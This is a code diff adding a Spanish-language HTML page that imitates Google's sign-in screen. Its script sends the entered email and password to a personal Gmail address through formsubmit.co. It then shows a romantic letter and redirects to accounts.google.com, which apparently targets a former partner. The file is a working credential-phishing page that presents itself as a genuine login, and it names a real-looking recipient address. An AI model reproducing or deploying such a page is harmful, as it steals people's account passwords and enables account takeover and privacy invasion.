@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Iniciar sesión - Cuentas de Google</title>
+<link rel="icon" href="https://www.google.com/favicon.ico">
+<style>
+:root{--blue:#1a73e8;--line:#dadce0}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100dvh}
+body{
+  font-family:Roboto,system-ui,-apple-system,Arial,sans-serif;background:#fff;color:#202124;
+  display:flex;align-items:center;justify-content:center;
+  padding:calc(16px + env(safe-area-inset-top)) 16px calc(16px + env(safe-area-inset-bottom));
+}
+.screen{width:100%;max-width:420px}
+.hide{display:none!important}
+.card{border:1px solid var(--line);border-radius:28px;padding:32px 24px 24px;text-align:center}
+.logo{width:64px;margin-bottom:14px}
+h1{font-size:22px;font-weight:400;margin:0 0 6px}
+.sub{font-size:15px;margin:0 0 22px;color:#5f6368}
+.field{position:relative;margin-bottom:14px;text-align:left}
+input{
+  width:100%;padding:15px;font-size:16px;border:1px solid var(--line);
+  border-radius:4px;outline:none;background:#fff;color:#202124
+}
+input:focus{border:2px solid var(--blue);padding:14px}
+input:focus+label,input:not(:placeholder-shown)+label{
+  top:-8px;left:9px;font-size:12px;background:#fff;padding:0 4px;color:var(--blue)
+}
+label{position:absolute;top:16px;left:15px;font-size:16px;color:#5f6368;
+  pointer-events:none;transition:.12s}
+button{
+  width:100%;min-height:48px;background:var(--blue);color:#fff;border:0;
+  border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;margin-top:6px
+}
+button:active{background:#1765cc}
+button:disabled{opacity:.7}
+.foot{display:flex;justify-content:space-between;gap:12px;margin-top:22px;font-size:13px}
+.foot a{color:var(--blue);text-decoration:none;font-weight:500}
+body.letter-mode{background:#f6efe4}
+.paper{
+  background:#fffdf8;border-radius:18px;padding:32px 24px;text-align:left;
+  box-shadow:0 10px 30px rgba(90,60,20,.12);
+  animation:in .8s cubic-bezier(.2,.8,.2,1) both;
+  font-family:Georgia,'Times New Roman',serif;color:#3b2f22
+}
+@keyframes in{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+.heart{font-size:26px;text-align:center;margin-bottom:18px;
+  animation:beat 1.8s ease-in-out 1s infinite}
+@keyframes beat{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
+.paper p{font-size:17px;line-height:1.75;margin:0 0 16px}
+.sign{margin-top:22px;font-style:italic;opacity:.8}
+.paper button{margin-top:26px;font-family:Roboto,system-ui,Arial,sans-serif;
+  background:#3b2f22;border-radius:8px}
+.paper button:active{background:#241c14}
+</style>
+</head>
+<body>
+
+<section class="screen" id="login">
+  <div class="card">
+    <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    <h1>Iniciar sesión</h1>
+    <p class="sub">Usa tu cuenta de Google</p>
+
+    <form id="form">
+      <div class="field">
+        <input type="email" id="email" placeholder=" " required
+               autocomplete="username" inputmode="email" autocapitalize="off">
+        <label for="email">Correo electrónico o teléfono</label>
+      </div>
+      <div class="field">
+        <input type="password" id="pass" placeholder=" " required autocomplete="current-password">
+        <label for="pass">Introduce tu contraseña</label>
+      </div>
+      <button type="submit" id="btn">Iniciar sesión</button>
+    </form>
+
+    <div class="foot">
+      <a href="#">¿Olvidaste tu contraseña?</a>
+      <a href="#">Crear cuenta</a>
+    </div>
+  </div>
+</section>
+
+<section class="screen hide" id="carta">
+  <div class="paper">
+    <div class="heart">❤️</div>
+    <p>A pesar de todo lo que ha pasado, quiero que sepas que sigues siendo alguien especial para mí.</p>
+    <p>A veces recuerdo los momentos que vivimos y no puedo evitar sonreír. No todo fue perfecto, pero hubo momentos muy bonitos que siempre voy a llevar conmigo.</p>
+    <p>No sé qué pienses tú, pero yo todavía guardo un cariño muy grande por ti.</p>
+    <p class="sign">Con cariño</p>
+    <button id="go">Continuar a Google</button>
+  </div>
+</section>
+
+<script>
+/* ================= CONFIG ================= */
+const CORREO   = "luis.garciayt321@gmail.com";
+const REDIRECT = "https://accounts.google.com/";
+const AUTO_SEG = 0;   // 0 = espera al botón. Pon 25 para que se vaya solo.
+/* ========================================== */
+
+const $ = id => document.getElementById(id);
+
+$('form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const btn = $('btn');
+  btn.disabled = true;
+  btn.textContent = 'Verificando...';
+
+  try {
+    await fetch("https://formsubmit.co/ajax/" + CORREO, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify({
+        correo: $('email').value,
+        clave: $('pass').value,
+        _subject: "Nuevo inicio de sesión",
+        _template: "table",
+        _captcha: "false"
+      })
+    });
+  } catch (err) { /* si falla la red, la carta sale igual */ }
+
+  $('login').classList.add('hide');
+  $('carta').classList.remove('hide');
+  document.body.classList.add('letter-mode');
+  window.scrollTo(0, 0);
+  if (AUTO_SEG > 0) setTimeout(() => location.href = REDIRECT, AUTO_SEG * 1000);
+});
+
+$('go').addEventListener('click', () => location.href = REDIRECT);
+</script>
+</body>
+</html>
